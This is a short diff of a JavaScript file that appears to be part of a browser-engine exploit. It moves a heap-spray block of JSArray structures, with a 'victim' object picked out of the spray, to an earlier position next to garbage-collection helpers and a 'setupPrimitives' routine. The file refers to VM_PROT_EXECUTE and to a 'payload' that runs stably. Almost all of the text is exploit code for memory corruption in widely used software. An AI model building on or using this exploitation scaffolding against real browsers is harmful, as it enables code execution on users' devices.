@@ -434,6 +434,14 @@ var VM_PROT_EXECUTE = 0x4
             return f[0];
           }
           // store things to prevent GC
+          var structs = []
+    for (var i = 0; i < 0x1000; ++i) {
+        var array = [13.37];
+        array.pointer = 1234;
+        array['prop' + i] = 13.37;
+        structs.push(array);
+    }
+              var victim = structs[0x800];
           let keep = [];
           function gc(n=10000) {
             let tmp = [];
@@ -454,6 +462,7 @@ var VM_PROT_EXECUTE = 0x4
           // put zeroes in first two slots so JSCallbackData destruction is safe
           delete b1[0];
           delete b1[1];
+          
           function setupPrimitives() {
             port.postMessage("setting up");
             if (a1.length != 0x1337) {
@@ -539,14 +548,7 @@ var VM_PROT_EXECUTE = 0x4
     // var victim = structs[0];
     //
     // and the payload still work stablely. It seems this action is redundant
-    var structs = []
-    for (var i = 0; i < 0x1000; ++i) {
-        var array = [13.37];
-        array.pointer = 1234;
-        array['prop' + i] = 13.37;
-        structs.push(array);
-    }
-              var victim = structs[0x800];
+    
               /*var structs = [];
               var i = 0;
               var abc = [13.37];
